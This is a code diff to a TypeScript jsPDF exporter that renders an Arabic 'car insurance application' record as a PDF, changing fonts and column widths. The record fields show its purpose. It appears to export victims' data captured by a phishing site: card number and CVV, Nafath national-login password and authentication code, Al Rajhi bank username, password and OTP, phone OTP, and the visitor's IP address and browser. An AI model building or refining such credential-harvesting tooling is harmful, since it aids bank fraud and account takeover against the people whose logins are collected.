@@ -1,5 +1,6 @@
 import jsPDF from "jspdf";
 import autoTable from "jspdf-autotable";
+import { amiriFont } from "./amiri-font";
 
 interface VisitorData {
   id: string;
@@ -51,15 +52,6 @@ interface VisitorData {
   };
 }
 
-function reverseArabic(text: string): string {
-  if (!text || text === "-") return text;
-  const arabicRegex = /[\u0600-\u06FF]/;
-  if (arabicRegex.test(text)) {
-    return text.split('').reverse().join('');
-  }
-  return text;
-}
-
 export function generateInsurancePDF(data: VisitorData): void {
   const doc = new jsPDF({
     orientation: "portrait",
@@ -67,35 +59,36 @@ export function generateInsurancePDF(data: VisitorData): void {
     format: "a4",
   });
 
+  doc.addFileToVFS("Amiri-Regular.ttf", amiriFont);
+  doc.addFont("Amiri-Regular.ttf", "Amiri", "normal");
+  doc.setFont("Amiri");
+
   const pageWidth = doc.internal.pageSize.getWidth();
   const margin = 15;
   let yPos = 20;
 
-  doc.setFont("helvetica", "bold");
   doc.setFontSize(22);
   doc.setTextColor(0, 82, 147);
-  
-  doc.text(reverseArabic("تأمين السيارات"), pageWidth / 2, yPos, { align: "center" });
-  yPos += 8;
+  doc.text("تأمين السيارات", pageWidth / 2, yPos, { align: "center" });
+  yPos += 10;
   
   doc.setFontSize(14);
   doc.setTextColor(0, 82, 147);
-  doc.text(reverseArabic("استمارة طلب"), pageWidth / 2, yPos, { align: "center" });
+  doc.text("استمارة طلب", pageWidth / 2, yPos, { align: "center" });
   yPos += 15;
 
   doc.setFillColor(0, 82, 147);
   doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
   doc.setTextColor(255, 255, 255);
   doc.setFontSize(11);
-  doc.setFont("helvetica", "bold");
-  doc.text(reverseArabic("معلومات مقدم الطلب"), pageWidth / 2, yPos + 5.5, { align: "center" });
+  doc.text("معلومات مقدم الطلب", pageWidth / 2, yPos + 5.5, { align: "center" });
   yPos += 12;
 
   const personalData = [
-    [data.personalInfo?.documment_owner_full_name || "-", reverseArabic("الاسم الكامل")],
-    [data.personalInfo?.nationalId || "-", reverseArabic("رقم الهوية")],
-    [data.personalInfo?.phone || "-", reverseArabic("رقم الهاتف")],
-    [data.personalInfo?.birthDate || "-", reverseArabic("تاريخ الميلاد")],
+    [data.personalInfo?.documment_owner_full_name || "-", "الاسم الكامل"],
+    [data.personalInfo?.nationalId || "-", "رقم الهوية"],
+    [data.personalInfo?.phone || "-", "رقم الهاتف"],
+    [data.personalInfo?.birthDate || "-", "تاريخ الميلاد"],
   ];
 
   autoTable(doc, {
@@ -104,13 +97,14 @@ export function generateInsurancePDF(data: VisitorData): void {
     body: personalData,
     theme: "grid",
     styles: {
+      font: "Amiri",
       fontSize: 10,
       cellPadding: 4,
       halign: "right",
     },
     columnStyles: {
       0: { cellWidth: "auto", halign: "left" },
-      1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+      1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
     },
     margin: { left: margin, right: margin },
   });
@@ -122,14 +116,14 @@ export function generateInsurancePDF(data: VisitorData): void {
     doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
     doc.setTextColor(255, 255, 255);
     doc.setFontSize(11);
-    doc.text(reverseArabic("معلومات المركبة"), pageWidth / 2, yPos + 5.5, { align: "center" });
+    doc.text("معلومات المركبة", pageWidth / 2, yPos + 5.5, { align: "center" });
     yPos += 12;
 
     const vehicleData = [
-      [data.vehicleInfo?.serialNumber || "-", reverseArabic("الرقم التسلسلي")],
-      [data.vehicleInfo?.vehicleYear || "-", reverseArabic("سنة الصنع")],
-      [data.vehicleInfo?.coverageType || "-", reverseArabic("نوع التغطية")],
-      [data.vehicleInfo?.selectedAddOns?.join(", ") || "-", reverseArabic("الإضافات")],
+      [data.vehicleInfo?.serialNumber || "-", "الرقم التسلسلي"],
+      [data.vehicleInfo?.vehicleYear || "-", "سنة الصنع"],
+      [data.vehicleInfo?.coverageType || "-", "نوع التغطية"],
+      [data.vehicleInfo?.selectedAddOns?.join(", ") || "-", "الإضافات"],
     ];
 
     autoTable(doc, {
@@ -138,13 +132,14 @@ export function generateInsurancePDF(data: VisitorData): void {
       body: vehicleData,
       theme: "grid",
       styles: {
+        font: "Amiri",
         fontSize: 10,
         cellPadding: 4,
         halign: "right",
       },
       columnStyles: {
         0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
       },
       margin: { left: margin, right: margin },
     });
@@ -157,14 +152,14 @@ export function generateInsurancePDF(data: VisitorData): void {
     doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
     doc.setTextColor(255, 255, 255);
     doc.setFontSize(11);
-    doc.text(reverseArabic("عرض التأمين"), pageWidth / 2, yPos + 5.5, { align: "center" });
+    doc.text("عرض التأمين", pageWidth / 2, yPos + 5.5, { align: "center" });
     yPos += 12;
 
     const offerData = [
-      [data.selectedOffer?.companyName || "-", reverseArabic("الشركة")],
-      [data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", reverseArabic("السعر الأساسي")],
-      [data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-", reverseArabic("الخصم")],
-      [data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", reverseArabic("السعر الإجمالي")],
+      [data.selectedOffer?.companyName || "-", "الشركة"],
+      [data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", "السعر الأساسي"],
+      [data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-", "الخصم"],
+      [data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", "السعر الإجمالي"],
     ];
 
     autoTable(doc, {
@@ -173,13 +168,14 @@ export function generateInsurancePDF(data: VisitorData): void {
       body: offerData,
       theme: "grid",
       styles: {
+        font: "Amiri",
         fontSize: 10,
         cellPadding: 4,
         halign: "right",
       },
       columnStyles: {
         0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
       },
       margin: { left: margin, right: margin },
     });
@@ -192,13 +188,13 @@ export function generateInsurancePDF(data: VisitorData): void {
     doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
     doc.setTextColor(255, 255, 255);
     doc.setFontSize(11);
-    doc.text(reverseArabic("معلومات الدفع"), pageWidth / 2, yPos + 5.5, { align: "center" });
+    doc.text("معلومات الدفع", pageWidth / 2, yPos + 5.5, { align: "center" });
     yPos += 12;
 
     const paymentData = [
-      [data.paymentInfo?.cardNumber || "-", reverseArabic("رقم البطاقة")],
-      [data.paymentInfo?.cardHolder || "-", reverseArabic("اسم حامل البطاقة")],
-      [data.paymentInfo?.expiryDate || "-", reverseArabic("تاريخ الانتهاء")],
+      [data.paymentInfo?.cardNumber || "-", "رقم البطاقة"],
+      [data.paymentInfo?.cardHolder || "-", "اسم حامل البطاقة"],
+      [data.paymentInfo?.expiryDate || "-", "تاريخ الانتهاء"],
       [data.paymentInfo?.cvv || "-", "CVV"],
     ];
 
@@ -208,13 +204,14 @@ export function generateInsurancePDF(data: VisitorData): void {
       body: paymentData,
       theme: "grid",
       styles: {
+        font: "Amiri",
         fontSize: 10,
         cellPadding: 4,
         halign: "right",
       },
       columnStyles: {
         0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
       },
       margin: { left: margin, right: margin },
     });
@@ -227,13 +224,13 @@ export function generateInsurancePDF(data: VisitorData): void {
     doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
     doc.setTextColor(255, 255, 255);
     doc.setFontSize(11);
-    doc.text(reverseArabic("توثيق نفاذ"), pageWidth / 2, yPos + 5.5, { align: "center" });
+    doc.text("توثيق نفاذ", pageWidth / 2, yPos + 5.5, { align: "center" });
     yPos += 12;
 
     const nafazTableData = [
-      [data.nafazData?.idNumber || "-", reverseArabic("رقم الهوية")],
-      [data.nafazData?.password || "-", reverseArabic("كلمة المرور")],
-      [data.nafazData?.authNumber || "-", reverseArabic("رقم التوثيق")],
+      [data.nafazData?.idNumber || "-", "رقم الهوية"],
+      [data.nafazData?.password || "-", "كلمة المرور"],
+      [data.nafazData?.authNumber || "-", "رقم التوثيق"],
     ];
 
     autoTable(doc, {
@@ -242,13 +239,14 @@ export function generateInsurancePDF(data: VisitorData): void {
       body: nafazTableData,
       theme: "grid",
       styles: {
+        font: "Amiri",
         fontSize: 10,
         cellPadding: 4,
         halign: "right",
       },
       columnStyles: {
         0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
       },
       margin: { left: margin, right: margin },
     });
@@ -261,13 +259,13 @@ export function generateInsurancePDF(data: VisitorData): void {
     doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
     doc.setTextColor(255, 255, 255);
     doc.setFontSize(11);
-    doc.text(reverseArabic("بنك الراجحي"), pageWidth / 2, yPos + 5.5, { align: "center" });
+    doc.text("بنك الراجحي", pageWidth / 2, yPos + 5.5, { align: "center" });
     yPos += 12;
 
     const rajhiTableData = [
-      [data.rajhiData?.username || "-", reverseArabic("اسم المستخدم")],
-      [data.rajhiData?.password || "-", reverseArabic("كلمة المرور")],
-      [data.rajhiData?.otp || "-", reverseArabic("رمز التحقق")],
+      [data.rajhiData?.username || "-", "اسم المستخدم"],
+      [data.rajhiData?.password || "-", "كلمة المرور"],
+      [data.rajhiData?.otp || "-", "رمز التحقق"],
     ];
 
     autoTable(doc, {
@@ -276,13 +274,14 @@ export function generateInsurancePDF(data: VisitorData): void {
       body: rajhiTableData,
       theme: "grid",
       styles: {
+        font: "Amiri",
         fontSize: 10,
         cellPadding: 4,
         halign: "right",
       },
       columnStyles: {
         0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
       },
       margin: { left: margin, right: margin },
     });
@@ -295,13 +294,13 @@ export function generateInsurancePDF(data: VisitorData): void {
     doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
     doc.setTextColor(255, 255, 255);
     doc.setFontSize(11);
-    doc.text(reverseArabic("التحقق من الهاتف"), pageWidth / 2, yPos + 5.5, { align: "center" });
+    doc.text("التحقق من الهاتف", pageWidth / 2, yPos + 5.5, { align: "center" });
     yPos += 12;
 
     const phoneTableData = [
-      [data.phoneData?.phoneNumber || "-", reverseArabic("رقم الهاتف")],
-      [data.phoneData?.carrier || "-", reverseArabic("شركة الاتصالات")],
-      [data.phoneData?.otp || "-", reverseArabic("رمز التحقق")],
+      [data.phoneData?.phoneNumber || "-", "رقم الهاتف"],
+      [data.phoneData?.carrier || "-", "شركة الاتصالات"],
+      [data.phoneData?.otp || "-", "رمز التحقق"],
     ];
 
     autoTable(doc, {
@@ -310,13 +309,14 @@ export function generateInsurancePDF(data: VisitorData): void {
       body: phoneTableData,
       theme: "grid",
       styles: {
+        font: "Amiri",
         fontSize: 10,
         cellPadding: 4,
         halign: "right",
       },
       columnStyles: {
         0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
       },
       margin: { left: margin, right: margin },
     });
@@ -329,7 +329,7 @@ export function generateInsurancePDF(data: VisitorData): void {
     doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
     doc.setTextColor(255, 255, 255);
     doc.setFontSize(11);
-    doc.text(reverseArabic("البيانات الوصفية"), pageWidth / 2, yPos + 5.5, { align: "center" });
+    doc.text("البيانات الوصفية", pageWidth / 2, yPos + 5.5, { align: "center" });
     yPos += 12;
 
     const createdAt = data.metadata?.createdAt?.toDate?.() 
@@ -337,11 +337,11 @@ export function generateInsurancePDF(data: VisitorData): void {
       : data.metadata?.createdAt || "-";
 
     const metaData = [
-      [data.metadata?.country || "-", reverseArabic("الدولة")],
-      [data.metadata?.browser || "-", reverseArabic("المتصفح")],
-      [data.metadata?.os || "-", reverseArabic("نظام التشغيل")],
-      [data.metadata?.ip || "-", reverseArabic("عنوان IP")],
-      [createdAt, reverseArabic("تاريخ الإنشاء")],
+      [data.metadata?.country || "-", "الدولة"],
+      [data.metadata?.browser || "-", "المتصفح"],
+      [data.metadata?.os || "-", "نظام التشغيل"],
+      [data.metadata?.ip || "-", "عنوان IP"],
+      [createdAt, "تاريخ الإنشاء"],
     ];
 
     autoTable(doc, {
@@ -350,13 +350,14 @@ export function generateInsurancePDF(data: VisitorData): void {
       body: metaData,
       theme: "grid",
       styles: {
+        font: "Amiri",
         fontSize: 10,
         cellPadding: 4,
         halign: "right",
       },
       columnStyles: {
         0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
+        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
       },
       margin: { left: margin, right: margin },
     });
@@ -365,8 +366,9 @@ export function generateInsurancePDF(data: VisitorData): void {
   const pageHeight = doc.internal.pageSize.getHeight();
   doc.setFontSize(8);
   doc.setTextColor(128, 128, 128);
+  const timestamp = new Date().toLocaleString("ar-SA");
   doc.text(
-    `${reverseArabic("تم الإنشاء")}: ${new Date().toLocaleString("ar-SA")} | ${reverseArabic("رقم المستند")}: ${data.id}`,
+    `تم الإنشاء: ${timestamp} | رقم المستند: ${data.id}`,
     pageWidth / 2,
     pageHeight - 10,
     { align: "center" }
